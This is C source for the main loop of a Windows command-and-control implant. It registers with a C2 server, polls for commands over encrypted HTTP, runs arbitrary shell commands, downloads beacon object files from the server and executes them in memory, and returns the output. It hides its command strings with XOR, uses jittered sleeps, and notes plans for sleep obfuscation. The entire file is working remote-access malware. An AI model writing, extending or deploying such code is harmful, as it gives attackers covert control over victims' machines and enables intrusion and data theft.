#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"
#include "ecdh.h"
#include "http.h"
#include "shell.h"

#define PATH_BUF_SIZE  512
#define AGENT_ID_SIZE  256

static char g_cmd_kill[5];
static char g_cmd_bof[5];

static void init_command_strings(void) {
    static const unsigned char k[] = {'K'^0x42,'I'^0x42,'L'^0x42,'L'^0x42,0};
    static const unsigned char b[] = {'B'^0x42,'O'^0x42,'F'^0x42,':'^0x42,0};
    for (int i = 0; k[i] || i == 0; i++) g_cmd_kill[i] = k[i] ^ 0x42;
    for (int i = 0; b[i] || i == 0; i++) g_cmd_bof[i] = b[i] ^ 0x42;
}

/* ---------------------------------------------------------------------------
 * process_command
 *
 * Shared command dispatch used by both the initial checkin response and
 * the main loop. Previously the initial checkin response was silently
 * discarded (free'd without reading), so any command the server sent
 * during registration was always lost.
 *
 * Returns 1 if the agent should exit (KILL command received), 0 otherwise.
 * --------------------------------------------------------------------------- */
static int process_command(char *cmd_plain, int cmd_len,
                            const char *agent_id) {
    if (cmd_len <= 0 || !cmd_plain) return 0;

    char *cmd = cmd_plain;
    char *end = cmd + cmd_len - 1;
    while (end >= cmd && (*end == '\r' || *end == '\n' || *end == ' '))
        *end-- = '\0';

    if (cmd[0] == '\0') return 0;

    if (strcmp(cmd, g_cmd_kill) == 0) {
        return 1;

    } else if (strncmp(cmd, g_cmd_bof, 4) == 0) {
        char *bof_name = cmd + 4;
        char *args_hex = strchr(bof_name, ':');
        if (!args_hex) {
            beacon_log("[!] Malformed BOF command: missing args separator\n");
            return 0;
        }
        *args_hex++ = '\0';

        uint8_t *bof_data = NULL;
        int      bof_len  = 0;
        char     bof_path[PATH_BUF_SIZE];
        snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s", agent_id, bof_name);

        if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT,
                                bof_path, NULL, 0,
                                &bof_data, &bof_len) == 0 && bof_data) {
            int   hex_len  = (int)strlen(args_hex);
            int   args_len = hex_len / 2;
            char *args     = (char *)malloc((size_t)(args_len + 1));
            if (args) {
                for (int i = 0; i < args_len; i++) {
                    unsigned int b = 0;
                    sscanf(args_hex + i * 2, "%2x", &b);
                    args[i] = (char)b;
                }
                args[args_len] = '\0';
                execute_bof((unsigned char *)bof_data, (size_t)bof_len,
                            args, args_len);
                free(args);
            }
            free(bof_data);
        } else {
            beacon_log("[!] Failed to fetch BOF: %s\n", bof_name);
        }

    } else {
        execute_shell_command(cmd);
    }

    return 0;
}

/* ---------------------------------------------------------------------------
 * main
 * --------------------------------------------------------------------------- */
int main(void) {
    char agent_id[AGENT_ID_SIZE] = {0};

    srand((unsigned int)GetTickCount());

    if (shell_init() != 0) {
        fprintf(stderr, "[!] shell_init failed\n");
        return 1;
    }

    // TODO: Add sleep obfuscation (ekko sleep, foliage, bunch of different techniques i could use)
    int attempt = 0;
    while (do_register(agent_id, AGENT_ID_SIZE) != 0) {
        attempt++;

        /* Exponential backoff: 5s, 10s, 20s, 40s, 80s, then capped
            * at 5 minutes. Add jitter so multiple beacons don't all
            * hammer the server at the same moment if the server just
            * came back up after an outage. */
        int base_ms = 5000;
        for (int i = 1; i < attempt && i < 6; i++) base_ms *= 2;
        if (base_ms > 300000) base_ms = 300000;  /* 5 min cap */
        int jitter = rand() % (base_ms / 4 + 1);
        int sleep_ms = base_ms + jitter;

        fprintf(stderr,
            "[!] Registration failed (attempt %d), retrying in %d ms\n",
            attempt, sleep_ms);
        Sleep((DWORD)sleep_ms);
    }

    /*
     * Initial checkin — sends startup output (empty), receives first command.
     * Previously this response was free()'d without being processed, so any
     * command the server queued during registration was silently dropped.
     */
    char     path[PATH_BUF_SIZE];
    uint8_t *resp     = NULL;
    int      resp_len = 0;
    snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);

    if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT, path,
                            (uint8_t *)shell_output_buf(), shell_output_len(),
                            &resp, &resp_len) == 0 && resp) {
        shell_buf_reset();
        int should_exit = process_command((char *)resp, resp_len, agent_id);
        free(resp);
        if (should_exit) {
            shell_cleanup();
            ExitProcess(0);
        }
    } else {
        free(resp);   /* free(NULL) is safe */
        shell_buf_reset();
    }

    init_command_strings();

    /* Main beacon loop */
    while (1) {
        snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);

        uint8_t *cmd_plain = NULL;
        int      cmd_len   = 0;

        int ok = http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT, path,
                                     (uint8_t *)shell_output_buf(),
                                     shell_output_len(),
                                     &cmd_plain, &cmd_len);
        shell_buf_reset();

        if (ok == 0 && cmd_plain) {
            int should_exit = process_command((char *)cmd_plain, cmd_len,
                                             agent_id);
            free(cmd_plain);
            if (should_exit) {
                shell_cleanup();
                ExitProcess(0);
            }
        } else {
            free(cmd_plain);   /* free(NULL) safe */
        }

        /*
         * Jitter calculation: C2_SLEEP_BASE_MS + rand in [-jitter, +jitter].
         * All arithmetic done in signed int first to avoid DWORD underflow
         * when rand() % (jitter*2) < jitter (which is 50% of the time).
         * The previous code used DWORD arithmetic: if the subtraction went
         * negative it wrapped to ~4 billion ms (Sleep of ~49 days).
         */
        int signed_sleep = (int)C2_SLEEP_BASE_MS
                         + (rand() % (int)(C2_SLEEP_JITTER_MS * 2))
                         - (int)C2_SLEEP_JITTER_MS;
        if (signed_sleep < 1000) signed_sleep = 1000;
        Sleep((DWORD)signed_sleep);
    }

    shell_cleanup();
    return 0;
}